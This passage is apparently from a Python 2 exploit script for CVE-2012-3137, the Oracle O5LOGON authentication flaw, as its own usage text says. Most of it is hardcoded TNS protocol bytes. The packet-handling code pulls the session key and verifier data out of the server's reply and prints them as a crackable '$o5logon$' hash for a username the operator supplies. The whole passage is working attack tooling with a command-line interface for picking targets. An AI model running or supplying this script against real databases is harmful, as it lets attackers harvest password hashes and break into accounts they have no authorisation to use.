						response+="\x00\x01\x87\x01\x87\x00\x01\x00\x00\x01\x89\x01\x89\x00\x01\x00"
						response+="\x00\x01\x8a\x01\x8a\x00\x01\x00\x00\x01\x8b\x01\x8b\x00\x01\x00"
						response+="\x00\x01\x8c\x01\x8c\x00\x01\x00\x00\x01\x8d\x01\x8d\x00\x01\x00"
						response+="\x00\x01\x8e\x01\x8e\x00\x01\x00\x00\x01\x8f\x01\x8f\x00\x01\x00"
						response+="\x00\x01\x90\x01\x90\x00\x01\x00\x00\x01\x91\x01\x91\x00\x01\x00"
						response+="\x00\x01\x94\x01\x94\x00\x01\x01\x25\x00\x01\x00\x00\x01\x95\x01"
						response+="\x95\x00\x01\x00\x00\x01\x96\x01\x96\x00\x01\x00\x00\x01\x97\x01"
						response+="\x97\x00\x01\x00\x00\x01\x9d\x01\x9d\x00\x01\x00\x00\x01\x9e\x01"
						response+="\x9e\x00\x01\x00\x00\x01\x9f\x01\x9f\x00\x01\x00\x00\x01\xa0\x01"
						response+="\xa0\x00\x01\x00\x00\x01\xa1\x01\xa1\x00\x01\x00\x00\x01\xa2\x01"
						response+="\xa2\x00\x01\x00\x00\x01\xa3\x01\xa3\x00\x01\x00\x00\x01\xa4\x01"
						response+="\xa4\x00\x01\x00\x00\x01\xa5\x01\xa5\x00\x01\x00\x00\x01\xa6\x01"
						response+="\xa6\x00\x01\x00\x00\x01\xa7\x01\xa7\x00\x01\x00\x00\x01\xa8\x01"
						response+="\xa8\x00\x01\x00\x00\x01\xa9\x01\xa9\x00\x01\x00\x00\x01\xaa\x01"
						response+="\xaa\x00\x01\x00\x00\x01\xab\x01\xab\x00\x01\x00\x00\x01\xad\x01"
						response+="\xad\x00\x01\x00\x00\x01\xae\x01\xae\x00\x01\x00\x00\x01\xaf\x01"
						response+="\xaf\x00\x01\x00\x00\x01\xb0\x01\xb0\x00\x01\x00\x00\x01\xb1\x01"
						response+="\xb1\x00\x01\x00\x00\x01\xc1\x01\xc1\x00\x01\x00\x00\x01\xc2\x01"
						response+="\xc2\x00\x01\x01\x25\x00\x01\x00\x00\x01\xc6\x01\xc6\x00\x01\x00"
						response+="\x00\x01\xc7\x01\xc7\x00\x01\x00\x00\x01\xc8\x01\xc8\x00\x01\x00"
						response+="\x00\x01\xc9\x01\xc9\x00\x01\x00\x00\x01\xca\x01\xca\x00\x01\x01"
						response+="\x9f\x00\x01\x00\x00\x01\xcb\x01\xcb\x00\x01\x01\xa0\x00\x01\x00"
						response+="\x00\x01\xcc\x01\xcc\x00\x01\x01\xa2\x00\x01\x00\x00\x01\xcd\x01"
						response+="\xcd\x00\x01\x01\xa3\x00\x01\x00\x00\x01\xce\x01\xce\x00\x01\x01"
						response+="\xb1\x00\x01\x00\x00\x01\xcf\x01\xcf\x00\x01\x01\x22\x00\x01\x00"
						response+="\x00\x01\xd2\x01\xd2\x00\x01\x00\x00\x01\xd3\x01\xd3\x00\x01\x01"
						response+="\xab\x00\x01\x00\x00\x01\xd4\x01\xd4\x00\x01\x00\x00\x01\xd5\x01"
						response+="\xd5\x00\x01\x00\x00\x01\xd6\x01\xd6\x00\x01\x00\x00\x01\xd7\x01"
						response+="\xd7\x00\x01\x00\x00\x01\xd8\x01\xd8\x00\x01\x00\x00\x01\xd9\x01"
						response+="\xd9\x00\x01\x00\x00\x01\xda\x01\xda\x00\x01\x00\x00\x01\xdb\x01"
						response+="\xdb\x00\x01\x00\x00\x01\xdc\x01\xdc\x00\x01\x00\x00\x01\xdd\x01"
						response+="\xdd\x00\x01\x00\x00\x01\xde\x01\xde\x00\x01\x00\x00\x01\xdf\x01"
						response+="\xdf\x00\x01\x00\x00\x01\xe0\x01\xe0\x00\x01\x00\x00\x01\xe1\x01"
						response+="\xe1\x00\x01\x00\x00\x01\xe2\x01\xe2\x00\x01\x00\x00\x01\xe3\x01"
						response+="\xe3\x00\x01\x01\x6b\x00\x01\x00\x00\x01\xe4\x01\xe4\x00\x01\x00"
						response+="\x00\x01\xe5\x01\xe5\x00\x01\x00\x00\x01\xe6\x01\xe6\x00\x01\x00"
						response+="\x00\x01\xea\x01\xea\x00\x01\x00\x00\x01\xeb\x01\xeb\x00\x01\x00"
						response+="\x00\x01\xec\x01\xec\x00\x01\x00\x00\x01\xed\x01\xed\x00\x01\x00"
						response+="\x00\x01\xee\x01\xee\x00\x01\x00\x00\x01\xef\x01\xef\x00\x01\x00"
						response+="\x00\x01\xf0\x01\xf0\x00\x01\x00\x00\x01\xf2\x01\xf2\x00\x01\x00"
						response+="\x00\x01\xf3\x01\xf3\x00\x01\x00\x00\x01\xf4\x01\xf4\x00\x01\x00"
						response+="\x00\x01\xf5\x01\xf5\x00\x01\x00\x00\x01\xf6\x01\xf6\x00\x01\x00"
						response+="\x00\x01\xfd\x01\xfd\x00\x01\x00\x00\x01\xfe\x01\xfe\x00\x01\x00"
						response+="\x00\x02\x01\x02\x01\x00\x01\x00\x00\x02\x02\x02\x02\x00\x01\x00"
						response+="\x00\x02\x04\x02\x04\x00\x01\x00\x00\x02\x05\x02\x05\x00\x01\x00"
						response+="\x00\x02\x06\x02\x06\x00\x01\x00\x00\x02\x07\x02\x07\x00\x01\x00"
						response+="\x00\x02\x08\x02\x08\x00\x01\x00\x00\x02\x09\x02\x09\x00\x01\x00"
						response+="\x00\x02\x0a\x02\x0a\x00\x01\x00\x00\x02\x0b\x02\x0b\x00\x01\x00"
						response+="\x00\x02\x0c\x02\x0c\x00\x01\x00\x00\x02\x0d\x02\x0d\x00\x01\x00"
						response+="\x00\x02\x0e\x02\x0e\x00\x01\x00\x00\x02\x0f\x02\x0f\x00\x01\x00"
						response+="\x00\x02\x10\x02\x10\x00\x01\x00\x00\x02\x11\x02\x11\x00\x01\x00"
						response+="\x00\x02\x12\x02\x12\x00\x01\x00\x00\x02\x13\x02\x13\x00\x01\x00"
						response+="\x00\x02\x14\x02\x14\x00\x01\x00\x00\x02\x15\x02\x15\x00\x01\x00"
						response+="\x00\x02\x16\x02\x16\x00\x01\x00\x00\x02\x17\x02\x17\x00\x01\x00"
						response+="\x00\x02\x18\x02\x18\x00\x01\x00\x00\x02\x19\x02\x19\x00\x01\x00"
						response+="\x00\x02\x1a\x02\x1a\x00\x01\x00\x00\x02\x1b\x02\x1b\x00\x01\x00"
						response+="\x00\x02\x1c\x02\x1c\x00\x01\x00\x00\x02\x1d\x02\x1d\x00\x01\x00"
						response+="\x00\x02\x1e\x02\x1e\x00\x01\x00\x00\x02\x1f\x02\x1f\x00\x01\x00"
						response+="\x00\x02\x20\x02\x20\x00\x01\x00\x00\x02\x21\x02\x21\x00\x01\x00"
						response+="\x00\x02\x22\x02\x22\x00\x01\x00\x00\x02\x23\x02\x23\x00\x01\x00"
						response+="\x00\x02\x24\x02\x24\x00\x01\x00\x00\x02\x25\x02\x25\x00\x01\x00"
						response+="\x00\x02\x26\x02\x26\x00\x01\x00\x00\x02\x27\x02\x27\x00\x01\x00"
						response+="\x00\x02\x28\x02\x28\x00\x01\x00\x00\x02\x29\x02\x29\x00\x01\x00"
						response+="\x00\x02\x2a\x02\x2a\x00\x01\x00\x00\x02\x2b\x02\x2b\x00\x01\x00"
						response+="\x00\x02\x2c\x02\x2c\x00\x01\x00\x00\x02\x2d\x02\x2d\x00\x01\x00"
						response+="\x00\x02\x2e\x02\x2e\x00\x01\x00\x00\x02\x2f\x02\x2f\x00\x01\x00"
						response+="\x00\x02\x31\x02\x31\x00\x01\x00\x00\x02\x32\x02\x32\x00\x01\x00"
						response+="\x00\x02\x33\x02\x33\x00\x01\x00\x00\x02\x34\x02\x34\x00\x01\x00"
						response+="\x00\x02\x37\x02\x37\x00\x01\x00\x00\x02\x38\x02\x38\x00\x01\x00"
						response+="\x00\x02\x39\x02\x39\x00\x01\x00\x00\x02\x3a\x02\x3a\x00\x01\x00"
						response+="\x00\x02\x3b\x02\x3b\x00\x01\x00\x00\x02\x3c\x02\x3c\x00\x01\x00"
						response+="\x00\x02\x3d\x02\x3d\x00\x01\x00\x00\x02\x3e\x02\x3e\x00\x01\x00"
						response+="\x00\x02\x3f\x02\x3f\x00\x01\x00\x00\x02\x40\x02\x40\x00\x01\x00"
						response+="\x00\x02\x41\x02\x41\x00\x01\x00\x00\x02\x42\x02\x42\x00\x01\x00"
						response+="\x00\x02\x43\x02\x43\x00\x01\x00\x00\x02\x44\x02\x44\x00\x01\x00"
						response+="\x00\x02\x45\x02\x45\x00\x01\x00\x00\x02\x46\x02\x46\x00\x01\x00"
						response+="\x00\x02\x47\x02\x47\x00\x01\x00\x00\x02\x48\x02\x48\x00\x01\x00"
						response+="\x00\x02\x49\x02\x49\x00\x01\x00\x00\x00\x03\x00\x02\x00\x0a\x00"
						response+="\x00\x00\x04\x00\x02\x00\x0a\x00\x00\x00\x05\x00\x01\x00\x01\x00"
						response+="\x00\x00\x06\x00\x02\x00\x0a\x00\x00\x00\x07\x00\x02\x00\x0a\x00"
						response+="\x00\x00\x09\x00\x01\x00\x01\x00\x00\x00\x0d\x00\x00\x00\x0e\x00"
						response+="\x00\x00\x0f\x00\x17\x00\x01\x00\x00\x00\x10\x00\x00\x00\x11\x00"
						response+="\x00\x00\x12\x00\x00\x00\x13\x00\x00\x00\x14\x00\x00\x00\x15\x00"
						response+="\x00\x00\x16\x00\x00\x00\x27\x00\x78\x00\x01\x01\x5d\x00\x01\x01"
						response+="\x26\x00\x01\x00\x00\x00\x3a\x00\x3a\x00\x01\x00\x00\x00\x44\x00"
						response+="\x02\x00\x0a\x00\x00\x00\x45\x00\x00\x00\x46\x00\x00\x00\x4a\x00"
						response+="\x6d\x00\x01\x00\x00\x00\x4c\x00\x00\x00\x5b\x00\x02\x00\x0a\x00"
						response+="\x00\x00\x5e\x00\x01\x00\x01\x00\x00\x00\x5f\x00\x17\x00\x01\x00"
						response+="\x00\x00\x60\x00\x60\x00\x01\x00\x00\x00\x61\x00\x60\x00\x01\x00"
						response+="\x00\x00\x64\x00\x64\x00\x01\x00\x00\x00\x65\x00\x65\x00\x01\x00"
						response+="\x00\x00\x66\x00\x66\x00\x01\x00\x00\x00\x68\x00\x00\x00\x69\x00"
						response+="\x00\x00\x6a\x00\x6a\x00\x01\x00\x00\x00\x6c\x00\x6d\x00\x01\x00"
						response+="\x00\x00\x6d\x00\x6d\x00\x01\x00\x00\x00\x6e\x00\x6f\x00\x01\x00"
						response+="\x00\x00\x6f\x00\x6f\x00\x01\x00\x00\x00\x70\x00\x70\x00\x01\x00"
						response+="\x00\x00\x71\x00\x71\x00\x01\x00\x00\x00\x72\x00\x72\x00\x01\x00"
						response+="\x00\x00\x73\x00\x73\x00\x01\x00\x00\x00\x74\x00\x66\x00\x01\x00"
						response+="\x00\x00\x76\x00\x00\x00\x77\x00\x00\x00\x79\x00\x79\x00\x01\x00"
						response+="\x00\x00\x7a\x00\x7a\x00\x01\x00\x00\x00\x7b\x00\x7b\x00\x01\x00"
						response+="\x00\x00\x88\x00\x00\x00\x92\x00\x92\x00\x01\x00\x00\x00\x93\x00"
						response+="\x93\x00\x01\x00\x00\x00\x98\x00\x02\x00\x0a\x00\x00\x00\x99\x00"
						response+="\x02\x00\x0a\x00\x00\x00\x9a\x00\x02\x00\x0a\x00\x00\x00\x9b\x00"
						response+="\x01\x00\x01\x00\x00\x00\x9c\x00\x0c\x00\x0a\x00\x00\x00\xac\x00"
						response+="\x02\x00\x0a\x00\x00\x00\xb2\x00\xb2\x00\x01\x00\x00\x00\xb3\x00"
						response+="\xb3\x00\x01\x00\x00\x00\xb4\x00\xb4\x00\x01\x00\x00\x00\xb5\x00"
						response+="\xb5\x00\x01\x00\x00\x00\xb6\x00\xb6\x00\x01\x00\x00\x00\xb7\x00"
						response+="\xb7\x00\x01\x00\x00\x00\xb8\x00\x0c\x00\x0a\x00\x00\x00\xb9\x00"
						response+="\xb2\x00\x01\x00\x00\x00\xba\x00\xb3\x00\x01\x00\x00\x00\xbb\x00"
						response+="\xb4\x00\x01\x00\x00\x00\xbc\x00\xb5\x00\x01\x00\x00\x00\xbd\x00"
						response+="\xb6\x00\x01\x00\x00\x00\xbe\x00\xb7\x00\x01\x00\x00\x00\xbf\x00"
						response+="\x00\x00\xc0\x00\x00\x00\xc3\x00\x70\x00\x01\x00\x00\x00\xc4\x00"
						response+="\x71\x00\x01\x00\x00\x00\xc5\x00\x72\x00\x01\x00\x00\x00\xd0\x00"
						response+="\xd0\x00\x01\x00\x00\x00\xd1\x00\x00\x00\xe7\x00\xe7\x00\x01\x00"
						response+="\x00\x00\xe8\x00\xe7\x00\x01\x00\x00\x00\xe9\x00\xe9\x00\x01\x00"
						response+="\x00\x00\xf1\x00\x6d\x00\x01\x00\x00\x02\x03\x02\x03\x00\x01\x00"
						response+="\x00\x00\x00"

					header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
					if debug: print "sending exchange data type representations"
					s.send(header+response)
					#response=flag
					#header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
					#s.send(header+response)
	
				if resp[10]=='\x02':
					if debug: print "receive exchange data type representations"
					#response="\x00\x00\x03\x76\x02\x40\x69\x04\x02\x00\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x50\x9e\x5b\x56\xff"
					#response+="\x7f\x00\x00\x05\x00\x00\x00\x45\x71\x02\x70\xf0\x98\x5b\x56\xff\x7f\x00\x00\x2c\xa2\x5b\x56\xff"
					#response+="\x7f\x00\x00"
					response="\x00\x00\x03\x76\x02\x01\x06\x00\x00\x00\x01\x00\x00\x00\x01\x05"
					response+="\x00\x00\x00\x01\x01"
					response+=pack('B',len(user))+bytes(user)
					response+=prepare('AUTH_TERMINAL')
					response+=prepare('pts/5')+'\x00\x00\x00\x00'
					response+=prepare('AUTH_PROGRAM_NM')
					response+=prepare('chall@bzh(TNS V1-V3)')+'\x00\x00\x00\x00'
					response+=prepare('AUTH_MACHINE')
					response+=prepare('bzh')+'\x00\x00\x00\x00'
					response+=prepare('AUTH_PID')
					response+=prepare('1337')+'\x00\x00\x00\x00'
					response+=prepare('AUTH_SID')
					response+=prepare('r1')+'\x00\x00\x00\x00'
					header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
					s.send(header+response)
				if resp[10]=='\x03':
					if debug: print "TTI Function Call"
					exit()
				if resp[10]=='\x08':
					if debug: print 'Server to client response'
					sizestrAUTH_SESSKEY,=unpack('B',resp[13])
					if debug: print sizestrAUTH_SESSKEY
					strAUTH_SESSKEY=resp[18:18+(sizestrAUTH_SESSKEY)]
					if debug: print strAUTH_SESSKEY
					sizeSESSKEY,=unpack('B',resp[18+sizestrAUTH_SESSKEY])
					if debug: print sizeSESSKEY
					offset = 18+sizestrAUTH_SESSKEY+5
					SESSKEY=resp[offset:offset+sizeSESSKEY]
					if debug: print SESSKEY
					offset = offset+sizeSESSKEY+4
					sizestrAUTH_VFR_DATA, =unpack('B',resp[offset])
					if debug: print sizestrAUTH_VFR_DATA
					offset=offset + 5
					strAUTH_VFR_DATA=resp[offset:offset+sizestrAUTH_VFR_DATA]
					if debug: print strAUTH_VFR_DATA
					offset = offset + sizestrAUTH_VFR_DATA + 4
					sizeVFR_DATA, = unpack('B',resp[offset])
					if debug: print sizeVFR_DATA
					VFR_DATA=resp[offset+1:offset+1+sizeVFR_DATA]
					if debug: print VFR_DATA
					print user+':$o5logon$'+SESSKEY+'*'+VFR_DATA
					s.close()
					return
			elif resp[4]=='\x04':
				print "error : bad service name"
				s.close()
				return
			else:
				if debug: print "error"
		except IndexError:
			print "procotol error"
			return

def usage():
	print "Usage: "+argv[0]+" -u user -s service_name -i host [options] "
	print "CVE-2012-3137 Oracle exploit"
	print ""
	print "-u, --user			username to test"
	print "-s, --service			oracle service name"
	print "-i, --host			server host or ip address"
	print "-p, --port			oracle port"
	print "-d, --debug			print debug message"

if __name__ == '__main__':
	try:
		opts, args = getopt.getopt(argv[1:], "hu:s:i:p:d", ["help", "user=", "service=", "host=", "port=", "debug"])
	except getopt.GetoptError as err:
		print(err)
		usage()
		exit()
	debug = False
	user=None
	service=None
	host=None
	port=1521
	for option, value in opts:
		if option == "-v":
			debug = True
		elif option in ("-h", "--help"):
			usage()
			exit()
		elif option in ("-u", "--user"):
			user = value
		elif option in ("-s", "--service"):
			service = value
		elif option in ("-i", "--host"):
			host = value
		elif option in ("-p", "--port"):
			port = value
		elif option in ("-d", "--debug"):
			debug=True
		else:
			print("Unknown option {}".format(option))
			exit()
	if user==None or service==None or host==None:
		usage()
		exit()
	connect(user, service, host, port, debug)
